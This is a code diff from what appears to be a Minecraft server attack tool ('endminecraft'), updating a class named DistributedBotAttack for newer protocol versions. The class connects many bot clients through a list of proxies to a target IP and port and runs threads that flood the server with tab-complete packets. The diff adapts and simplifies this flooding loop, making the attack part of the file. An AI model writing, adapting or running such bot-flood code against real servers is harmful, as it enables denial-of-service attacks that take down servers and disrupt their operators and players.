@@ -1,19 +1,16 @@
 package me.alikomi.endminecraft.tasks.attack;
 
+import com.github.steveice10.mc.protocol.MinecraftProtocol;
+import com.github.steveice10.mc.protocol.packet.ingame.client.ClientChatPacket;
+import com.github.steveice10.mc.protocol.packet.ingame.client.ClientTabCompletePacket;
+import com.github.steveice10.mc.protocol.packet.ingame.server.ServerJoinGamePacket;
+import com.github.steveice10.packetlib.Client;
+import com.github.steveice10.packetlib.event.session.*;
+import com.github.steveice10.packetlib.tcp.TcpSessionFactory;
 import me.alikomi.endminecraft.Main;
 import me.alikomi.endminecraft.tasks.tabAttack.Tab17_8;
 import me.alikomi.endminecraft.utils.MinecraftPackets;
 import me.alikomi.endminecraft.utils.Util;
-import org.spacehq.mc.protocol.MinecraftProtocol;
-import org.spacehq.mc.protocol.packet.ingame.client.ClientChatPacket;
-import org.spacehq.mc.protocol.packet.ingame.client.ClientTabCompletePacket;
-import org.spacehq.mc.protocol.packet.ingame.client.player.*;
-import org.spacehq.mc.protocol.packet.ingame.server.ServerJoinGamePacket;
-import org.spacehq.mc.protocol.packet.ingame.server.ServerSwitchCameraPacket;
-import org.spacehq.packetlib.Client;
-import org.spacehq.packetlib.event.session.*;
-import org.spacehq.packetlib.packet.Packet;
-import org.spacehq.packetlib.tcp.TcpSessionFactory;
 
 import java.io.OutputStream;
 import java.net.InetSocketAddress;
@@ -23,7 +20,7 @@ import java.util.*;
 import java.util.concurrent.locks.Lock;
 import java.util.concurrent.locks.ReentrantLock;
 
-public class DistributedBotAttack extends Util {
+public class DistributedBotAttack_111_112 extends Util {
 
     private static String ip;
     private static int port;
@@ -43,7 +40,7 @@ public class DistributedBotAttack extends Util {
     private String tabComplete = Main.configer.get("", "DBA.tabAttack.command");
 
 
-    public DistributedBotAttack(String ip, int port, long time, int sleepTime, Map<String, Proxy.Type> ips) {
+    public DistributedBotAttack_111_112(String ip, int port, long time, int sleepTime, Map<String, Proxy.Type> ips) {
         this.ip = ip;
         this.port = port;
         this.time = time;
@@ -141,30 +138,19 @@ public class DistributedBotAttack extends Util {
                     }).start();
 
                     if (tab) {
-                        if (Main.minecraftVersion.contains("1.7") || Main.minecraftVersion.contains("1.8")) {
-                            log("1.7 - 1.8 版本TAB开启");
-                            new Thread(new Tab17_8(client,ip,tabSleep)).start();
-                        } else if (Main.minecraftVersion.contains("1.9") || Main.minecraftVersion.contains("1.10")) {
-                            log("1.9 - 1.10 版本TAB开启");
-                            new Thread(() -> {
-                                while (isAttack) {
-                                    client.getSession().send(new ClientTabCompletePacket(tabComplete,false));
-                                    try {
-                                        Thread.sleep(tabSleep);
-                                    } catch (InterruptedException e) {
-                                        e.printStackTrace();
-                                    }
+                        new Thread(() -> {
+                            while (isAttack) {
+                                client.getSession().send(new ClientTabCompletePacket(tabComplete,false));
+                                try {
+                                    Thread.sleep(tabSleep);
+                                } catch (InterruptedException e) {
+                                    e.printStackTrace();
                                 }
-                            }).start();
-                        } else if (Main.minecraftVersion.contains("1.11")) {
-                            log("1.11版本TAB开启");
-                        }else {
-                            log("启动器错误！！请尝试重新开启");
-                        }
+                            }
+                        }).start();
                     }
                 }
             }
-
             public void packetSent(PacketSentEvent packetSentEvent) {
 
             }
